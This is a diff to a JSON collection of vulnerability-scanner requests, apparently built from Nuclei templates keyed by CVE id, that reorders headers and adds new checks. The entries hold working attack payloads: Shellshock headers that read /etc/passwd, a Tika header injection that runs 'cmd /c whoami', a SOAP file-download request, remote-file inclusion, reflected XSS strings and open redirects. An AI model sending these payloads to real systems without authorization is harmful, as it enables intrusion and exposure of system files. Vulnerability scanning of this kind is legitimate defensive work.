@@ -3277,9 +3277,9 @@
       "requests": [
         {
           "headers": {
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6051,11 +6051,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
-            "Content-type": "image/jp2"
+            "Content-type": "image/jp2",
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -7335,6 +7335,21 @@
         {
           "raw": [
             "POST /timesheet/login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscript%3E&password=pd&submit=Login\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-1010290",
+      "info": {
+        "name": "Babel - Open Redirection",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/modules/babel/redirect.php?newurl=http://example.com"
           ]
         }
       ]
@@ -10410,9 +10425,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml",
-            "Cookie": "Login"
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -12977,6 +12992,21 @@
       ]
     },
     {
+      "id": "CVE-2021-25028",
+      "info": {
+        "name": "Event Tickets < 5.2.2 - Open Redirect",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-admin/admin.php?page=wp_ajax_rsvp-form&tribe_tickets_redirect_to=https://example.com"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-25052",
       "info": {
         "name": "The Button Generator WordPress plugin < 2.3.3 - RFI",
@@ -12987,6 +13017,36 @@
           "raw": [
             "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie=WP%20Cookie%20check\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1\n",
             "GET /wp-admin/admin.php?page=wow-company&tab=http://{{interactsh-url}}/ HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-25063",
+      "info": {
+        "name": "Contact Form 7 Skins <= 2.5.0 - Reflected Cross-Site Scripting (XSS)",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie=WP%20Cookie%20check\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1\n",
+            "GET /wp-admin/admin.php?page=cf7skins&tab=%27%3E%3Cimg+src+onerror%3Dalert%28document.domain%29%3E HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-25074",
+      "info": {
+        "name": "WebP Converter for Media < 4.0.3 - Unauthenticated Open redirect",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=https://example.com"
           ]
         }
       ]
@@ -15463,6 +15523,21 @@
       ]
     },
     {
+      "id": "CVE-2022-0149",
+      "info": {
+        "name": "WooCommerce – Store Exporter < 2.7.1 - Reflected Cross-Site Scripting (XSS)",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie=WP%20Cookie%20check\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1\n",
+            "GET /wp-admin/admin.php?page=woo_ce&failed=1&message=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-0218",
       "info": {
         "name": "HTML Email Template Designer < 3.1 - Stored Cross-Site Scripting (XSS)",
@@ -15563,6 +15638,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/plugin"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-25323",
+      "info": {
+        "name": "ZEROF Web Server 2.0 XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/admin.back<img%20src=x%20onerror=alert(document.domain)>"
           ]
         }
       ]
